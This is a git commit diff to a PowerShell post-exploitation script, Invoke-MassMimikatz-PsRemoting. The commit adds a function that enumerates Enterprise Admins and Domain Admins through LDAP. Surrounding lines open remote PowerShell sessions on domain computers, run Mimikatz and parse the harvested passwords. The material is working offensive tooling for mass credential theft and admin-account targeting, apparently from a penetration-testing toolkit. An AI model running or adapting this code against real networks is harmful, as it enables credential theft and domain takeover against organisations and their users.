8d823020352e89dd1c71fc66926bd07e79ee4551
Scott Sutherland <scott.sutherland@nullbind.com>
2015-07-11 14:03:35 -0500

    Update Invoke-MassMimikatz-PsRemoting.ps1

--- Brainstorming/ADS/Invoke-MassMimikatz-PsRemoting.ps1
+++ Brainstorming/ADS/Invoke-MassMimikatz-PsRemoting.ps1
@@ -71,6 +71,86 @@ function Invoke-MassMimikatz-PsRemoting
 
     Process
     {
+        # ----------------------------------------
+        # domain group membership function  
+        # ----------------------------------------        
+        function Get-GroupMember
+        {
+            [CmdletBinding()]
+            Param(
+                [Parameter(Mandatory=$false,
+                HelpMessage="Credentials to use when connecting to a Domain Controller.")]
+                [System.Management.Automation.PSCredential]
+                [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
+        
+                [Parameter(Mandatory=$false,
+                HelpMessage="Domain controller for Domain and Site that you want to query against.")]
+                [string]$DomainController,
+
+                [Parameter(Mandatory=$false,
+                HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
+                [string]$Group = "Domain Admins",
+
+                [Parameter(Mandatory=$false,
+                HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
+                [int]$Limit = 1000,
+
+                [Parameter(Mandatory=$false,
+                HelpMessage="scope of a search as either a base, one-level, or subtree search, default is subtree.")]
+                [ValidateSet("Subtree","OneLevel","Base")]
+                [string]$SearchScope = "Subtree",
+
+                [Parameter(Mandatory=$false,
+                HelpMessage="Distinguished Name Path to limit search to.")]
+                [string]$SearchDN
+            )
+  
+            if ($DomainController -and $Credential.GetNetworkCredential().Password)
+               {
+                    $root = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)", $Credential.UserName,$Credential.GetNetworkCredential().Password
+                    $rootdn = $root | select distinguishedName -ExpandProperty distinguishedName
+                    $objDomain = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/CN=$Group, CN=Users,$rootdn" , $Credential.UserName,$Credential.GetNetworkCredential().Password
+                    $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
+                }
+                else
+                {
+                    $root = ([ADSI]"").distinguishedName
+                    $objDomain = [ADSI]("LDAP://CN=$Group, CN=Users," + $root)  
+                    $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
+                }
+        
+                # Create data table to house results to return
+                $TblMembers = New-Object System.Data.DataTable 
+                $TblMembers.Columns.Add("GroupMember") | Out-Null 
+                $TblMembers.Clear()
+
+                $objDomain.member | %{                    
+                    $TblMembers.Rows.Add($_.split("=")[1].split(",")[0]) | Out-Null 
+                }
+
+                return $TblMembers
+        }
+
+        
+        # ----------------------------------------
+        # Get list of important group members
+        # ----------------------------------------
+        Write-Verbose "Getting list of Enterprise and Domain Admins..."
+        if ($DomainController -and $Credential.GetNetworkCredential().Password)            
+        {           
+            $EnterpriseAdmins = Get-GroupMember -Group "Enterprise Admins" -DomainController $DomainController -Credential $Credential
+            $DomainAdmins = Get-GroupMember -Group "Domain Admins" -DomainController $DomainController -Credential $Credential
+        }else{
+
+            $EnterpriseAdmins = Get-GroupMember -Group "Enterprise Admins"
+            $DomainAdmins = Get-GroupMember -Group "Domain Admins"
+        }
+
+        $EaCount = $EnterpriseAdmins.row.count
+        $DaCount = $DomainAdmins.row.count
+
+        Write-Verbose "Found $EaCount Enterprise Admins"
+        Write-Verbose "Found $DaCount Domain Admins"
 
         # ----------------------------------------
         # Get the list of domain computers
@@ -123,7 +203,8 @@ function Invoke-MassMimikatz-PsRemoting
 
         # ----------------------------------------
         # Mimikatz prase function (Will Schoeder's) 
-        # ----------------------------------------        
+        # ----------------------------------------  
+              
         # This is a *very slightly mod version of will schroeder's function from:
         # https://raw.githubusercontent.com/Veil-Framework/PowerTools/master/PewPewPew/Invoke-MassMimikatz.ps1
         function Parse-Mimikatz {
@@ -244,7 +325,6 @@ function Invoke-MassMimikatz-PsRemoting
             return $TblPasswords_Clean
         }
 
-
         # ----------------------------------------
         # Establish sessions
         # ---------------------------------------- 
@@ -271,7 +351,6 @@ function Invoke-MassMimikatz-PsRemoting
                 New-PSSession -ComputerName $MyComputer -Credential $Credential -ErrorAction SilentlyContinue -ThrottleLimit $MaxHosts | Out-Null          
             }
         }                   
-
 
         # ---------------------------------------------
         # Attempt to run mimikatz against open sessions
